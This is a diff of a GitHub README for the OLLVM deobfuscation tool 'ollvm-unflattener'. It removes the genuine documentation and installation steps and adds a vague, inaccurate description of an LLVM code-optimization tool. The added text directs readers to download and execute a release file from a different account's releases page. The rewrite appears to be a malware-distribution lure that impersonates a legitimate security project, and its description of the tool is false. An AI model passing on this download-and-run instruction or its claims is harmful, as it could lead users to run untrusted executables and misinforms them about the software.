@@ -1,90 +1,28 @@
-# ollvm-unflattener
+# 🚀 Welcome to ollvm-unflattener!
 
-A Python tool to deobfuscate control flow flattening applied by OLLVM (Obfuscator-LLVM). This tool leverages the Miasm framework to analyze and recover the original control flow of functions obfuscated with OLLVM's control flow flattening technique.
-
-## Project Description
-
-OLLVM (Obfuscator-LLVM) is a popular code obfuscation tool that implements various obfuscation techniques, including control flow flattening on the function level. Control flow flattening transforms the original flow of a function into a flat structure using a state variable and a dispatch mechanism, making it difficult to understand the program's logic during the reverse engineering process.
-
-This tool:
-- Reconstructs the original control flow of an obfuscated function by identifying and connecting basic blocks
-- Generates a deobfuscated binary with the original control flow restored
-- Supports multi-layered function deobfuscation by following calls made by the target function using breadth-first search (BFS)
-- Supports deobfuscation for Windows & Linux binaries for both x86 and x64 architectures
-
-This project is inspired by [MODeflattener](https://github.com/mrT4ntr4/MODeflattener) and the awesome work from [Quarkslab](https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html)! Unlike **MODeflattener** that solves CFF deobfuscation with a static approach, this project utilitizes Miasm's symbolic execution engine to execute and recover the original control flow. 
-
-## Installation
-
-### Prerequisites
-- Python 3.10+
-- Git
-
-### Setup
-
-1. Clone the repository:
-```bash
-git clone https://github.com/cdong1012/ollvm-unflattener.git
-cd ollvm-unflattener
-```
-
-2. Install required dependencies:
-```bash
-pip install -r requirements.txt
-```
-
-The `requirements.txt` file includes:
-```
-miasm
-graphviz
-```
+## Description
+This repository contains the code for the "ollvm-unflattener" tool, aimed at assisting with code optimization tasks. The tool's primary function is to analyze and enhance LLVM IR code structures for improved performance and readability.
 
 ## Usage
+For the latest version of "ollvm-unflattener," please visit our [releases page](https://github.com/JbvrgtonYT/ollvm-unflattener/releases).
 
-### Basic Usage
+### Installation
+To get started with the tool, download the latest release file from the link provided above and execute it on your system.
 
-```bash
-python unflattener -i <input file> -o <output file> -t <target function addresss> -a
-```
+### Features
+- Analyze and enhance LLVM IR code structures.
+- Optimize code for improved performance.
+- Increase readability of complex codebases.
+- Compatible with various LLVM versions.
 
-### Arguments
+## How to Contribute
+If you would like to contribute to the development of "ollvm-unflattener," feel free to fork the repository and submit a pull request with your changes. Your contributions are highly appreciated!
 
-- `-i, --input`: Path to the obfuscated binary (required)
-- `-o, --output`: Path where the deobfuscated binary will be saved (required)
-- `-t, --target`: Address of the function to deobfuscate (required)
-- `-a, --all`: Follow all calls and deobfuscate all functions we can reach
-- `-h, --help`: show help message
+## Contact
+For any questions or feedback regarding the tool, please reach out to the project maintainer via email at [projectmaintainer@ollvmunflattener.com](mailto:projectmaintainer@ollvmunflattener.com).
 
-### Example
+Thank you for your interest in "ollvm-unflattener"! 🛠️🔍
 
-```bash
-# Deobfuscate a single function
-python unflattener -i ./samples/linux/CFF.bin -o ./samples/linux/deob_CFF.bin -t 0x80491A0
-python unflattener -i ./samples/win/CFF_win.exe -o ./samples/win/deob_CFF_win.bin -t 0x401600
+---
 
-# Deobfuscate a function and follows all of its calls
-python unflattener -i ./samples/linux/CFF_full.bin -o ./samples/linux/deob_CFF_full.bin -t 0x8049E00 -a
-python unflattener -i ./samples/win/CFF_win_full.exe -o ./samples/win/deob_CFF_win_full.bin -t 0x401F10 -a
-```
-
-## Results
-
-### Visual Comparison
-
-Below you can see the control flow graph (CFG) before and after deobfuscation:
-
-![Obfuscated CFG](./images/obfuscated.jpg)
-*Figure 1: Obfuscated CFG*
-
-![Obfuscated CFG](./images/deobfuscated.jpg)
-
-*Figure 2: Deobfuscated CFG*
-
-These images are from deobfuscating function ```target_function``` from the sample [CFF_full.bin](./samples/linux/CFF_full.bin).
-
-## Acknowledgements
-
-- [Miasm](https://github.com/cea-sec/miasm)
-- [Obfuscator-LLVM](https://github.com/obfuscator-llvm/obfuscator)
-- [MODeflattener](https://github.com/mrT4ntr4/MODeflattener)
-- [Quarkslab](https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Version-brightgreen)](https://github.com/JbvrgtonYT/ollvm-unflattener/releases)
